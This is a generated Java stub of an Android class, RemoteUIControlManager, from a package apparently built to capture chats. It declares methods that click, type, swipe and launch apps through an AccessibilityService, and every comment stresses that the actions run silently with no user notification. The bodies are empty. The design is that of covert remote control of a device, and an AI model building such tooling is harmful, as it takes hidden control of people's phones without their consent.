package com.chats.capture.managers;

/**
 * Manages remote UI control via AccessibilityService
 * All operations execute silently in background
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000@\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u0007\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u000f\n\u0002\u0010\t\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\"\u0010\u0007\u001a\u00020\b2\u0006\u0010\t\u001a\u00020\n2\u0006\u0010\u000b\u001a\u00020\n2\n\b\u0002\u0010\f\u001a\u0004\u0018\u00010\rJ\u001a\u0010\u000e\u001a\u00020\b2\u0006\u0010\u000f\u001a\u00020\r2\n\b\u0002\u0010\f\u001a\u0004\u0018\u00010\rJ\u001a\u0010\u0010\u001a\u00020\b2\u0006\u0010\u0011\u001a\u00020\r2\n\b\u0002\u0010\f\u001a\u0004\u0018\u00010\rJ2\u0010\u0012\u001a\u00020\b2\u0006\u0010\u000f\u001a\u00020\r2\n\b\u0002\u0010\u0013\u001a\u0004\u0018\u00010\r2\n\b\u0002\u0010\u0011\u001a\u0004\u0018\u00010\r2\n\b\u0002\u0010\f\u001a\u0004\u0018\u00010\rJ\u000e\u0010\u0014\u001a\u00020\b2\u0006\u0010\f\u001a\u00020\rJ\u001a\u0010\u0015\u001a\u00020\b2\u0006\u0010\u0016\u001a\u00020\r2\n\b\u0002\u0010\f\u001a\u0004\u0018\u00010\rJ0\u0010\u0017\u001a\u00020\b2\u0006\u0010\u0018\u001a\u00020\n2\u0006\u0010\u0019\u001a\u00020\n2\u0006\u0010\u001a\u001a\u00020\n2\u0006\u0010\u001b\u001a\u00020\n2\b\b\u0002\u0010\u001c\u001a\u00020\u001dJ\n\u0010\u001e\u001a\u0004\u0018\u00010\u001fH\u0002J\u0010\u0010 \u001a\u00020!2\u0006\u0010\f\u001a\u00020\rH\u0002R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\""}, d2 = {"Lcom/chats/capture/managers/RemoteUIControlManager;", "", "context", "Landroid/content/Context;", "(Landroid/content/Context;)V", "controlScope", "Lkotlinx/coroutines/CoroutineScope;", "executeUIClick", "", "x", "", "y", "packageName", "", "executeUIFindAndClick", "text", "executeUIFindAndClickById", "viewId", "executeUIInput", "findText", "executeUILaunchApp", "executeUIScroll", "direction", "executeUISwipe", "startX", "startY", "endX", "endY", "duration", "", "getAccessibilityService", "Lcom/chats/capture/services/EnhancedAccessibilityService;", "switchToApp", "", "app_debug"})
public final class RemoteUIControlManager {
    @org.jetbrains.annotations.NotNull()
    private final android.content.Context context = null;
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope controlScope = null;
    
    public RemoteUIControlManager(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
        super();
    }
    
    /**
     * Execute UI click at coordinates
     * Silent operation - no user notification
     */
    public final boolean executeUIClick(float x, float y, @org.jetbrains.annotations.Nullable()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Find node by text and click
     * Silent operation - no user notification
     */
    public final boolean executeUIFindAndClick(@org.jetbrains.annotations.NotNull()
    java.lang.String text, @org.jetbrains.annotations.Nullable()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Find node by view ID and click
     * Silent operation - no user notification
     */
    public final boolean executeUIFindAndClickById(@org.jetbrains.annotations.NotNull()
    java.lang.String viewId, @org.jetbrains.annotations.Nullable()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Find field and input text
     * Silent operation - no user notification
     */
    public final boolean executeUIInput(@org.jetbrains.annotations.NotNull()
    java.lang.String text, @org.jetbrains.annotations.Nullable()
    java.lang.String findText, @org.jetbrains.annotations.Nullable()
    java.lang.String viewId, @org.jetbrains.annotations.Nullable()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Execute scroll in direction
     * Silent operation - no user notification
     */
    public final boolean executeUIScroll(@org.jetbrains.annotations.NotNull()
    java.lang.String direction, @org.jetbrains.annotations.Nullable()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Execute swipe gesture
     * Silent operation - no user notification
     */
    public final boolean executeUISwipe(float startX, float startY, float endX, float endY, long duration) {
        return false;
    }
    
    /**
     * Launch app silently
     * Silent operation - no user notification
     */
    public final boolean executeUILaunchApp(@org.jetbrains.annotations.NotNull()
    java.lang.String packageName) {
        return false;
    }
    
    /**
     * Get AccessibilityService instance
     */
    private final com.chats.capture.services.EnhancedAccessibilityService getAccessibilityService() {
        return null;
    }
    
    /**
     * Switch to target app by launching it
     * Silent operation - no user notification
     */
    private final void switchToApp(java.lang.String packageName) {
    }
}